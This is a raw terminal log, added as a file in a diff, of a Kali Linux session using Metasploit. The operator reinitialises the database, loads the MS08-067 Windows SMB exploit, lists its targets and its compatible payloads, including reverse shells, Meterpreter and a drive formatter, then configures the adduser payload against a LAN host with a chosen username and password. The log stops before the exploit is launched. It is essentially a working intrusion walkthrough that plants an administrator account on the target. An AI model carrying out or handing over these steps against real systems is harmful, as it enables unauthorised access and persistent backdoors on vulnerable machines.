@@ -1,0 +1,519 @@
+root@kali:/usr/share/metasploit-framework/modules/exploits/windows/smb# cd ~
+root@kali:~# service postgresql start
+root@kali:~# service postgresql status
+● postgresql.service - PostgreSQL RDBMS
+   Loaded: loaded (/lib/systemd/system/postgresql.service; dis
+   Active: active (exited) since Sat 2019-07-13 15:53:54 IST; 
+  Process: 2391 ExecStart=/bin/true (code=exited, status=0/SUC
+ Main PID: 2391 (code=exited, status=0/SUCCESS)
+
+Jul 13 15:53:54 kali systemd[1]: Starting PostgreSQL RDBMS...
+Jul 13 15:53:54 kali systemd[1]: Started PostgreSQL RDBMS.
+
+root@kali:~# msfdb reinit
+[i] Database already started
+[+] Dropping databases 'msf'
+dropdb: database removal failed: ERROR:  database "msf" is being accessed by other users
+DETAIL:  There are 2 other sessions using the database.
+[+] Dropping databases 'msf_test'
+[+] Dropping database user 'msf'
+dropuser: removal of role "msf" failed: ERROR:  role "msf" cannot be dropped because some objects depend on it
+DETAIL:  owner of database msf
+132 objects in database msf
+[+] Deleting configuration file /usr/share/metasploit-framework/config/database.yml
+[+] Stopping database
+[+] Starting database
+[+] Resetting password of database user 'msf'
+[+] Creating databases 'msf_test'
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+[+] Creating initial database schema
+root@kali:~# msf console
+bash: msf: command not found
+root@kali:~# msfconsole
+                                                  
+
+     .~+P``````-o+:.                                      -o+:.
+.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
++++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
+++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
+--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
+                                `...............`              `...-/////...`
+
+
+                                  .::::::::::-.                     .::::::-
+                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
+                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy
+                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`
+                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
+                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
+    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/
+      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
+    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
+    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
+          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
+          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
+          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
+........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
+================================================================================
+=====================+--------------------------------+=========================
+=====================| Session one died of dysentery. |=========================
+=====================+--------------------------------+=========================
+================================================================================
+
+                     Press ENTER to size up the situation
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+                        Press SPACE BAR to continue
+
+
+
+       =[ metasploit v4.17.3-dev                          ]
++ -- --=[ 1797 exploits - 1019 auxiliary - 310 post       ]
++ -- --=[ 538 payloads - 41 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf > search ms08-067
+
+Matching Modules
+================
+
+   Name                                 Disclosure Date  Rank   Description
+   ----                                 ---------------  ----   -----------
+   exploit/windows/smb/ms08_067_netapi  2008-10-28       great  MS08-067 Microsoft Server Service Relative Path Stack Corruption
+
+
+msf > use exploit/windows/smb/ms08_067_netapi
+msf exploit(windows/smb/ms08_067_netapi) > info
+
+       Name: MS08-067 Microsoft Server Service Relative Path Stack Corruption
+     Module: exploit/windows/smb/ms08_067_netapi
+   Platform: Windows
+       Arch: 
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Great
+  Disclosed: 2008-10-28
+
+Provided by:
+  hdm <x@hdm.io>
+  Brett Moore <brett.moore@insomniasec.com>
+  frank2 <frank2@dc949.org>
+  jduck <jduck@metasploit.com>
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Automatic Targeting
+  1   Windows 2000 Universal
+  2   Windows XP SP0/SP1 Universal
+  3   Windows 2003 SP0 Universal
+  4   Windows XP SP2 English (AlwaysOn NX)
+  5   Windows XP SP2 English (NX)
+  6   Windows XP SP3 English (AlwaysOn NX)
+  7   Windows XP SP3 English (NX)
+  8   Windows XP SP2 Arabic (NX)
+  9   Windows XP SP2 Chinese - Traditional / Taiwan (NX)
+  10  Windows XP SP2 Chinese - Simplified (NX)
+  11  Windows XP SP2 Chinese - Traditional (NX)
+  12  Windows XP SP2 Czech (NX)
+  13  Windows XP SP2 Danish (NX)
+  14  Windows XP SP2 German (NX)
+  15  Windows XP SP2 Greek (NX)
+  16  Windows XP SP2 Spanish (NX)
+  17  Windows XP SP2 Finnish (NX)
+  18  Windows XP SP2 French (NX)
+  19  Windows XP SP2 Hebrew (NX)
+  20  Windows XP SP2 Hungarian (NX)
+  21  Windows XP SP2 Italian (NX)
+  22  Windows XP SP2 Japanese (NX)
+  23  Windows XP SP2 Korean (NX)
+  24  Windows XP SP2 Dutch (NX)
+  25  Windows XP SP2 Norwegian (NX)
+  26  Windows XP SP2 Polish (NX)
+  27  Windows XP SP2 Portuguese - Brazilian (NX)
+  28  Windows XP SP2 Portuguese (NX)
+  29  Windows XP SP2 Russian (NX)
+  30  Windows XP SP2 Swedish (NX)
+  31  Windows XP SP2 Turkish (NX)
+  32  Windows XP SP3 Arabic (NX)
+  33  Windows XP SP3 Chinese - Traditional / Taiwan (NX)
+  34  Windows XP SP3 Chinese - Simplified (NX)
+  35  Windows XP SP3 Chinese - Traditional (NX)
+  36  Windows XP SP3 Czech (NX)
+  37  Windows XP SP3 Danish (NX)
+  38  Windows XP SP3 German (NX)
+  39  Windows XP SP3 Greek (NX)
+  40  Windows XP SP3 Spanish (NX)
+  41  Windows XP SP3 Finnish (NX)
+  42  Windows XP SP3 French (NX)
+  43  Windows XP SP3 Hebrew (NX)
+  44  Windows XP SP3 Hungarian (NX)
+  45  Windows XP SP3 Italian (NX)
+  46  Windows XP SP3 Japanese (NX)
+  47  Windows XP SP3 Korean (NX)
+  48  Windows XP SP3 Dutch (NX)
+  49  Windows XP SP3 Norwegian (NX)
+  50  Windows XP SP3 Polish (NX)
+  51  Windows XP SP3 Portuguese - Brazilian (NX)
+  52  Windows XP SP3 Portuguese (NX)
+  53  Windows XP SP3 Russian (NX)
+  54  Windows XP SP3 Swedish (NX)
+  55  Windows XP SP3 Turkish (NX)
+  56  Windows 2003 SP1 English (NO NX)
+  57  Windows 2003 SP1 English (NX)
+  58  Windows 2003 SP1 Japanese (NO NX)
+  59  Windows 2003 SP1 Spanish (NO NX)
+  60  Windows 2003 SP1 Spanish (NX)
+  61  Windows 2003 SP1 French (NO NX)
+  62  Windows 2003 SP1 French (NX)
+  63  Windows 2003 SP2 English (NO NX)
+  64  Windows 2003 SP2 English (NX)
+  65  Windows 2003 SP2 German (NO NX)
+  66  Windows 2003 SP2 German (NX)
+  67  Windows 2003 SP2 Portuguese - Brazilian (NX)
+  68  Windows 2003 SP2 Spanish (NO NX)
+  69  Windows 2003 SP2 Spanish (NX)
+  70  Windows 2003 SP2 Japanese (NO NX)
+  71  Windows 2003 SP2 French (NO NX)
+  72  Windows 2003 SP2 French (NX)
+
+Basic options:
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  RHOST                     yes       The target address
+  RPORT    445              yes       The SMB service port (TCP)
+  SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+Payload information:
+  Space: 408
+  Avoid: 8 characters
+
+Description:
+  This module exploits a parsing flaw in the path canonicalization 
+  code of NetAPI32.dll through the Server Service. This module is 
+  capable of bypassing NX on some operating systems and service packs. 
+  The correct target must be used to prevent the Server Service (along 
+  with a dozen others in the same process) from crashing. Windows XP 
+  targets seem to handle multiple successful exploitation events, but 
+  2003 targets will often crash or hang on subsequent attempts. This 
+  is just the first version of this module, full support for NX bypass 
+  on 2003, along with other platforms, is still in development.
+
+References:
+  https://cvedetails.com/cve/CVE-2008-4250/
+  OSVDB (49243)
+  https://technet.microsoft.com/en-us/library/security/MS08-067
+  http://www.rapid7.com/vulndb/lookup/dcerpc-ms-netapi-netpathcanonicalize-dos
+
+msf exploit(windows/smb/ms08_067_netapi) > show payloads
+
+Compatible Payloads
+===================
+
+   Name                                                Disclosure Date  Rank    Description
+   ----                                                ---------------  ----    -----------
+   generic/custom                                                       normal  Custom Payload
+   generic/debug_trap                                                   normal  Generic x86 Debug Trap
+   generic/shell_bind_tcp                                               normal  Generic Command Shell, Bind TCP Inline
+   generic/shell_reverse_tcp                                            normal  Generic Command Shell, Reverse TCP Inline
+   generic/tight_loop                                                   normal  Generic x86 Tight Loop
+   windows/adduser                                                      normal  Windows Execute net user /ADD
+   windows/dllinject/bind_hidden_ipknock_tcp                            normal  Reflective DLL Injection, Hidden Bind Ipknock TCP Stager
+   windows/dllinject/bind_hidden_tcp                                    normal  Reflective DLL Injection, Hidden Bind TCP Stager
+   windows/dllinject/bind_ipv6_tcp                                      normal  Reflective DLL Injection, Bind IPv6 TCP Stager (Windows x86)
+   windows/dllinject/bind_ipv6_tcp_uuid                                 normal  Reflective DLL Injection, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/dllinject/bind_named_pipe                                    normal  Reflective DLL Injection, Windows x86 Bind Named Pipe Stager
+   windows/dllinject/bind_nonx_tcp                                      normal  Reflective DLL Injection, Bind TCP Stager (No NX or Win7)
+   windows/dllinject/bind_tcp                                           normal  Reflective DLL Injection, Bind TCP Stager (Windows x86)
+   windows/dllinject/bind_tcp_rc4                                       normal  Reflective DLL Injection, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/dllinject/bind_tcp_uuid                                      normal  Reflective DLL Injection, Bind TCP Stager with UUID Support (Windows x86)
+   windows/dllinject/reverse_hop_http                                   normal  Reflective DLL Injection, Reverse Hop HTTP/HTTPS Stager
+   windows/dllinject/reverse_http                                       normal  Reflective DLL Injection, Windows Reverse HTTP Stager (wininet)
+   windows/dllinject/reverse_ipv6_tcp                                   normal  Reflective DLL Injection, Reverse TCP Stager (IPv6)
+   windows/dllinject/reverse_nonx_tcp                                   normal  Reflective DLL Injection, Reverse TCP Stager (No NX or Win7)
+   windows/dllinject/reverse_ord_tcp                                    normal  Reflective DLL Injection, Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/dllinject/reverse_tcp                                        normal  Reflective DLL Injection, Reverse TCP Stager
+   windows/dllinject/reverse_tcp_allports                               normal  Reflective DLL Injection, Reverse All-Port TCP Stager
+   windows/dllinject/reverse_tcp_dns                                    normal  Reflective DLL Injection, Reverse TCP Stager (DNS)
+   windows/dllinject/reverse_tcp_rc4                                    normal  Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/dllinject/reverse_tcp_uuid                                   normal  Reflective DLL Injection, Reverse TCP Stager with UUID Support
+   windows/dllinject/reverse_udp                                        normal  Reflective DLL Injection, Reverse UDP Stager with UUID Support
+   windows/dns_txt_query_exec                                           normal  DNS TXT Record Payload Download and Execution
+   windows/exec                                                         normal  Windows Execute Command
+   windows/format_all_drives                                            manual  Windows Drive Formatter
+   windows/loadlibrary                                                  normal  Windows LoadLibrary Path
+   windows/messagebox                                                   normal  Windows MessageBox
+   windows/meterpreter/bind_hidden_ipknock_tcp                          normal  Windows Meterpreter (Reflective Injection), Hidden Bind Ipknock TCP Stager
+   windows/meterpreter/bind_hidden_tcp                                  normal  Windows Meterpreter (Reflective Injection), Hidden Bind TCP Stager
+   windows/meterpreter/bind_ipv6_tcp                                    normal  Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
+   windows/meterpreter/bind_ipv6_tcp_uuid                               normal  Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/meterpreter/bind_named_pipe                                  normal  Windows Meterpreter (Reflective Injection), Windows x86 Bind Named Pipe Stager
+   windows/meterpreter/bind_nonx_tcp                                    normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (No NX or Win7)
+   windows/meterpreter/bind_tcp                                         normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (Windows x86)
+   windows/meterpreter/bind_tcp_rc4                                     normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/meterpreter/bind_tcp_uuid                                    normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)
+   windows/meterpreter/reverse_hop_http                                 normal  Windows Meterpreter (Reflective Injection), Reverse Hop HTTP/HTTPS Stager
+   windows/meterpreter/reverse_http                                     normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (wininet)
+   windows/meterpreter/reverse_https                                    normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (wininet)
+   windows/meterpreter/reverse_https_proxy                              normal  Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager with Support for Custom Proxy
+   windows/meterpreter/reverse_ipv6_tcp                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (IPv6)
+   windows/meterpreter/reverse_named_pipe                               normal  Windows Meterpreter (Reflective Injection), Windows x86 Reverse Named Pipe (SMB) Stager
+   windows/meterpreter/reverse_nonx_tcp                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (No NX or Win7)
+   windows/meterpreter/reverse_ord_tcp                                  normal  Windows Meterpreter (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/meterpreter/reverse_tcp                                      normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager
+   windows/meterpreter/reverse_tcp_allports                             normal  Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager
+   windows/meterpreter/reverse_tcp_dns                                  normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)
+   windows/meterpreter/reverse_tcp_rc4                                  normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/meterpreter/reverse_tcp_uuid                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager with UUID Support
+   windows/meterpreter/reverse_udp                                      normal  Windows Meterpreter (Reflective Injection), Reverse UDP Stager with UUID Support
+   windows/metsvc_bind_tcp                                              normal  Windows Meterpreter Service, Bind TCP
+   windows/metsvc_reverse_tcp                                           normal  Windows Meterpreter Service, Reverse TCP Inline
+   windows/patchupdllinject/bind_hidden_ipknock_tcp                     normal  Windows Inject DLL, Hidden Bind Ipknock TCP Stager
+   windows/patchupdllinject/bind_hidden_tcp                             normal  Windows Inject DLL, Hidden Bind TCP Stager
+   windows/patchupdllinject/bind_ipv6_tcp                               normal  Windows Inject DLL, Bind IPv6 TCP Stager (Windows x86)
+   windows/patchupdllinject/bind_ipv6_tcp_uuid                          normal  Windows Inject DLL, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/patchupdllinject/bind_named_pipe                             normal  Windows Inject DLL, Windows x86 Bind Named Pipe Stager
+   windows/patchupdllinject/bind_nonx_tcp                               normal  Windows Inject DLL, Bind TCP Stager (No NX or Win7)
+   windows/patchupdllinject/bind_tcp                                    normal  Windows Inject DLL, Bind TCP Stager (Windows x86)
+   windows/patchupdllinject/bind_tcp_rc4                                normal  Windows Inject DLL, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/patchupdllinject/bind_tcp_uuid                               normal  Windows Inject DLL, Bind TCP Stager with UUID Support (Windows x86)
+   windows/patchupdllinject/reverse_ipv6_tcp                            normal  Windows Inject DLL, Reverse TCP Stager (IPv6)
+   windows/patchupdllinject/reverse_nonx_tcp                            normal  Windows Inject DLL, Reverse TCP Stager (No NX or Win7)
+   windows/patchupdllinject/reverse_ord_tcp                             normal  Windows Inject DLL, Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/patchupdllinject/reverse_tcp                                 normal  Windows Inject DLL, Reverse TCP Stager
+   windows/patchupdllinject/reverse_tcp_allports                        normal  Windows Inject DLL, Reverse All-Port TCP Stager
+   windows/patchupdllinject/reverse_tcp_dns                             normal  Windows Inject DLL, Reverse TCP Stager (DNS)
+   windows/patchupdllinject/reverse_tcp_rc4                             normal  Windows Inject DLL, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/patchupdllinject/reverse_tcp_uuid                            normal  Windows Inject DLL, Reverse TCP Stager with UUID Support
+   windows/patchupdllinject/reverse_udp                                 normal  Windows Inject DLL, Reverse UDP Stager with UUID Support
+   windows/patchupmeterpreter/bind_hidden_ipknock_tcp                   normal  Windows Meterpreter (skape/jt Injection), Hidden Bind Ipknock TCP Stager
+   windows/patchupmeterpreter/bind_hidden_tcp                           normal  Windows Meterpreter (skape/jt Injection), Hidden Bind TCP Stager
+   windows/patchupmeterpreter/bind_ipv6_tcp                             normal  Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager (Windows x86)
+   windows/patchupmeterpreter/bind_ipv6_tcp_uuid                        normal  Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/patchupmeterpreter/bind_named_pipe                           normal  Windows Meterpreter (skape/jt Injection), Windows x86 Bind Named Pipe Stager
+   windows/patchupmeterpreter/bind_nonx_tcp                             normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager (No NX or Win7)
+   windows/patchupmeterpreter/bind_tcp                                  normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager (Windows x86)
+   windows/patchupmeterpreter/bind_tcp_rc4                              normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/patchupmeterpreter/bind_tcp_uuid                             normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager with UUID Support (Windows x86)
+   windows/patchupmeterpreter/reverse_ipv6_tcp                          normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (IPv6)
+   windows/patchupmeterpreter/reverse_nonx_tcp                          normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (No NX or Win7)
+   windows/patchupmeterpreter/reverse_ord_tcp                           normal  Windows Meterpreter (skape/jt Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/patchupmeterpreter/reverse_tcp                               normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager
+   windows/patchupmeterpreter/reverse_tcp_allports                      normal  Windows Meterpreter (skape/jt Injection), Reverse All-Port TCP Stager
+   windows/patchupmeterpreter/reverse_tcp_dns                           normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (DNS)
+   windows/patchupmeterpreter/reverse_tcp_rc4                           normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/patchupmeterpreter/reverse_tcp_uuid                          normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager with UUID Support
+   windows/patchupmeterpreter/reverse_udp                               normal  Windows Meterpreter (skape/jt Injection), Reverse UDP Stager with UUID Support
+   windows/shell/bind_hidden_ipknock_tcp                                normal  Windows Command Shell, Hidden Bind Ipknock TCP Stager
+   windows/shell/bind_hidden_tcp                                        normal  Windows Command Shell, Hidden Bind TCP Stager
+   windows/shell/bind_ipv6_tcp                                          normal  Windows Command Shell, Bind IPv6 TCP Stager (Windows x86)
+   windows/shell/bind_ipv6_tcp_uuid                                     normal  Windows Command Shell, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/shell/bind_named_pipe                                        normal  Windows Command Shell, Windows x86 Bind Named Pipe Stager
+   windows/shell/bind_nonx_tcp                                          normal  Windows Command Shell, Bind TCP Stager (No NX or Win7)
+   windows/shell/bind_tcp                                               normal  Windows Command Shell, Bind TCP Stager (Windows x86)
+   windows/shell/bind_tcp_rc4                                           normal  Windows Command Shell, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/shell/bind_tcp_uuid                                          normal  Windows Command Shell, Bind TCP Stager with UUID Support (Windows x86)
+   windows/shell/reverse_ipv6_tcp                                       normal  Windows Command Shell, Reverse TCP Stager (IPv6)
+   windows/shell/reverse_nonx_tcp                                       normal  Windows Command Shell, Reverse TCP Stager (No NX or Win7)
+   windows/shell/reverse_ord_tcp                                        normal  Windows Command Shell, Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/shell/reverse_tcp                                            normal  Windows Command Shell, Reverse TCP Stager
+   windows/shell/reverse_tcp_allports                                   normal  Windows Command Shell, Reverse All-Port TCP Stager
+   windows/shell/reverse_tcp_dns                                        normal  Windows Command Shell, Reverse TCP Stager (DNS)
+   windows/shell/reverse_tcp_rc4                                        normal  Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/shell/reverse_tcp_uuid                                       normal  Windows Command Shell, Reverse TCP Stager with UUID Support
+   windows/shell/reverse_udp                                            normal  Windows Command Shell, Reverse UDP Stager with UUID Support
+   windows/shell_bind_tcp                                               normal  Windows Command Shell, Bind TCP Inline
+   windows/shell_hidden_bind_tcp                                        normal  Windows Command Shell, Hidden Bind TCP Inline
+   windows/shell_reverse_tcp                                            normal  Windows Command Shell, Reverse TCP Inline
+   windows/speak_pwned                                                  normal  Windows Speech API - Say "You Got Pwned!"
+   windows/upexec/bind_hidden_ipknock_tcp                               normal  Windows Upload/Execute, Hidden Bind Ipknock TCP Stager
+   windows/upexec/bind_hidden_tcp                                       normal  Windows Upload/Execute, Hidden Bind TCP Stager
+   windows/upexec/bind_ipv6_tcp                                         normal  Windows Upload/Execute, Bind IPv6 TCP Stager (Windows x86)
+   windows/upexec/bind_ipv6_tcp_uuid                                    normal  Windows Upload/Execute, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/upexec/bind_named_pipe                                       normal  Windows Upload/Execute, Windows x86 Bind Named Pipe Stager
+   windows/upexec/bind_nonx_tcp                                         normal  Windows Upload/Execute, Bind TCP Stager (No NX or Win7)
+   windows/upexec/bind_tcp                                              normal  Windows Upload/Execute, Bind TCP Stager (Windows x86)
+   windows/upexec/bind_tcp_rc4                                          normal  Windows Upload/Execute, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/upexec/bind_tcp_uuid                                         normal  Windows Upload/Execute, Bind TCP Stager with UUID Support (Windows x86)
+   windows/upexec/reverse_ipv6_tcp                                      normal  Windows Upload/Execute, Reverse TCP Stager (IPv6)
+   windows/upexec/reverse_nonx_tcp                                      normal  Windows Upload/Execute, Reverse TCP Stager (No NX or Win7)
+   windows/upexec/reverse_ord_tcp                                       normal  Windows Upload/Execute, Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/upexec/reverse_tcp                                           normal  Windows Upload/Execute, Reverse TCP Stager
+   windows/upexec/reverse_tcp_allports                                  normal  Windows Upload/Execute, Reverse All-Port TCP Stager
+   windows/upexec/reverse_tcp_dns                                       normal  Windows Upload/Execute, Reverse TCP Stager (DNS)
+   windows/upexec/reverse_tcp_rc4                                       normal  Windows Upload/Execute, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/upexec/reverse_tcp_uuid                                      normal  Windows Upload/Execute, Reverse TCP Stager with UUID Support
+   windows/upexec/reverse_udp                                           normal  Windows Upload/Execute, Reverse UDP Stager with UUID Support
+   windows/vncinject/bind_hidden_ipknock_tcp                            normal  VNC Server (Reflective Injection), Hidden Bind Ipknock TCP Stager
+   windows/vncinject/bind_hidden_tcp                                    normal  VNC Server (Reflective Injection), Hidden Bind TCP Stager
+   windows/vncinject/bind_ipv6_tcp                                      normal  VNC Server (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
+   windows/vncinject/bind_ipv6_tcp_uuid                                 normal  VNC Server (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/vncinject/bind_named_pipe                                    normal  VNC Server (Reflective Injection), Windows x86 Bind Named Pipe Stager
+   windows/vncinject/bind_nonx_tcp                                      normal  VNC Server (Reflective Injection), Bind TCP Stager (No NX or Win7)
+   windows/vncinject/bind_tcp                                           normal  VNC Server (Reflective Injection), Bind TCP Stager (Windows x86)
+   windows/vncinject/bind_tcp_rc4                                       normal  VNC Server (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/vncinject/bind_tcp_uuid                                      normal  VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)
+   windows/vncinject/reverse_hop_http                                   normal  VNC Server (Reflective Injection), Reverse Hop HTTP/HTTPS Stager
+   windows/vncinject/reverse_http                                       normal  VNC Server (Reflective Injection), Windows Reverse HTTP Stager (wininet)
+   windows/vncinject/reverse_ipv6_tcp                                   normal  VNC Server (Reflective Injection), Reverse TCP Stager (IPv6)
+   windows/vncinject/reverse_nonx_tcp                                   normal  VNC Server (Reflective Injection), Reverse TCP Stager (No NX or Win7)
+   windows/vncinject/reverse_ord_tcp                                    normal  VNC Server (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/vncinject/reverse_tcp                                        normal  VNC Server (Reflective Injection), Reverse TCP Stager
+   windows/vncinject/reverse_tcp_allports                               normal  VNC Server (Reflective Injection), Reverse All-Port TCP Stager
+   windows/vncinject/reverse_tcp_dns                                    normal  VNC Server (Reflective Injection), Reverse TCP Stager (DNS)
+   windows/vncinject/reverse_tcp_rc4                                    normal  VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/vncinject/reverse_tcp_uuid                                   normal  VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support
+   windows/vncinject/reverse_udp                                        normal  VNC Server (Reflective Injection), Reverse UDP Stager with UUID Support
+
+msf exploit(windows/smb/ms08_067_netapi) > info windows/adduser
+
+       Name: Windows Execute net user /ADD
+     Module: payload/windows/adduser
+   Platform: Windows
+       Arch: x86
+Needs Admin: Yes
+ Total size: 282
+       Rank: Normal
+
+Provided by:
+  hdm <x@hdm.io>
+  Chris John Riley
+  vlad902 <vlad902@gmail.com>
+  sf <stephen_fewer@harmonysecurity.com>
+
+Basic options:
+Name      Current Setting  Required  Description
+----      ---------------  --------  -----------
+CUSTOM                     no        Custom group name to be used instead of default
+EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+PASS      Metasploit$1     yes       The password for this user
+USER      metasploit       yes       The username to create
+WMIC      false            yes       Use WMIC on the target to resolve administrators group
+
+Description:
+  Create a new user and add them to local administration group. Note: 
+  The specified password is checked for common complexity requirements 
+  to prevent the target machine rejecting the user for failing to meet 
+  policy requirements. Complexity check: 8-14 chars (1 UPPER, 1 lower, 
+  1 digit/special)
+
+
+msf exploit(windows/smb/ms08_067_netapi) > show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST                     yes       The target address
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+msf exploit(windows/smb/ms08_067_netapi) > set payload windows/adduser
+payload => windows/adduser
+msf exploit(windows/smb/ms08_067_netapi) > info msf exploit(windows/smb/ms08_067_netapi) > set payload windows/adduser
+[-] Invalid module: msf
+
+[-] Invalid module: exploit(windows/smb/ms08_067_netapi)
+^C[-] Error while running command info: 
+msf exploit(windows/smb/ms08_067_netapi) > show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST                     yes       The target address
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Payload options (windows/adduser):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   CUSTOM                     no        Custom group name to be used instead of default
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   PASS      Metasploit$1     yes       The password for this user
+   USER      metasploit       yes       The username to create
+   WMIC      false            yes       Use WMIC on the target to resolve administrators group
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+msf exploit(windows/smb/ms08_067_netapi) > set RHOST 192.168.0.116
+RHOST => 192.168.0.116
+msf exploit(windows/smb/ms08_067_netapi) > set USER Anonymous
+USER => Anonymous
+msf exploit(windows/smb/ms08_067_netapi) > set PASS 123@Anonymous
